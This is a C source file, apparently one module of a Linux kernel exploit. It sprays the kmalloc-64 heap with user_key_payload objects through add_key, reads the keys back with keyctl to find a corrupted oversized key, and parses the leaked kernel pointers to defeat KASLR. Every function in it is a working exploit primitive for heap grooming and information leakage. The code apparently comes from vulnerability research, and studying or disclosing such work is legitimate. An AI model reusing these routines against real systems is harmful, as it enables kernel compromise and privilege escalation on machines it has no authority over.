#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <limits.h>
#include <linux/keyctl.h>

#include "log.h"
#include "keyring.h"
#include "util.h"

/**
 * spray_keyring(): Spray the heap with `user_key_payload` structure
 * @spray_size: Number of object to put into the `kmalloc-64` cache
 *
 * Return: Allocated buffer with serial numbers of the created keys
 */
key_serial_t *spray_keyring(uint32_t spray_size) {

    char key_desc[KEY_DESC_MAX_SIZE];
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    if (id_buffer == NULL)
        do_error_exit("calloc");

    for (uint32_t i = 0; i < spray_size; i++) {
        snprintf(key_desc, KEY_DESC_MAX_SIZE, "RandoriSec-%03du", i);
        id_buffer[i] = add_key("user", key_desc, key_desc, strlen(key_desc), KEY_SPEC_PROCESS_KEYRING);
        if (id_buffer[i] < 0)
            do_error_exit("add_key");
    }

    return id_buffer;
}

/**
 * parse_leak(): Parse the infoleak to compute the kaslr base
 * @buffer: Buffer that contains the infoleak
 * @buffer_size: Size of the previous buffer
 *
 * Return: KASLR base of the running kernel
 */
struct leak *parse_leak(long *buffer, uint32_t buffer_size) {
    struct leak *ret = malloc(sizeof(struct leak));
    if (!ret)
        do_error_exit("malloc");

    for (uint32_t i = 0; i < buffer_size; i++) {

        /*
         * Search for reference to the struct pipe_buf_operations
         * anon_pipe_buf_ops which is static const. Note that the
         * KASLR base offset is 2MB aligned, which is why we have
         * the 0xfffff masking.
         */
        if ((buffer[i] & 0xfffff) == (ANON_PIPE_BUF_OPS_OFFSET & 0xfffff)) {
            ret->kaslr_base   = buffer[i] - ANON_PIPE_BUF_OPS_OFFSET;
            ret->vmemmap_base = buffer[i - 2] & VMEMMAP_MASK;
            ret->base_crng    = ret->kaslr_base + BASE_CRNG_OFFSET;
            ret->pending_bit  = ret->kaslr_base + PENDING_BIT_OFFSET;
            return ret;
        }
    }

    free(ret);
    return NULL;
}

/**
 * get_keyring_leak(): Find the infoleak and compute the needed bases
 * @id_buffer: Buffer with the serial numbers of keys used to spray the heap
 * @id_buffer_size: Size of the previous buffer
 *
 * Search for a key with an unexpected size to find the corrupted object.
 *
 * Return: KASLR base and physmap base of the running kernel
 */
struct leak *get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    
    uint8_t buffer[USHRT_MAX] = {0};
    int32_t keylen;

    for (uint32_t i = 0; i < id_buffer_size; i++) {

        keylen = keyctl(KEYCTL_READ, id_buffer[i], (long)buffer, USHRT_MAX, 0);
        if (keylen < 0)
            do_error_exit("keyctl");

        if (keylen == USHRT_MAX) {
            return parse_leak((long *)buffer, keylen >> 3);
        }
    }
    return 0;
}

/**
 * release_keys(): Release user_key_payload objects
 * @id_buffer: Buffer that stores the id of the key to remove
 * @id_buffer_size: Size of the previous buffer
 */
void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    
    for (uint32_t i = 0; i < id_buffer_size; i++) {
        if (keyctl(KEYCTL_REVOKE, id_buffer[i], 0, 0, 0) < 0)
            do_error_exit("keyctl(KEYCTL_REVOKE)");
    }

    free(id_buffer);
}
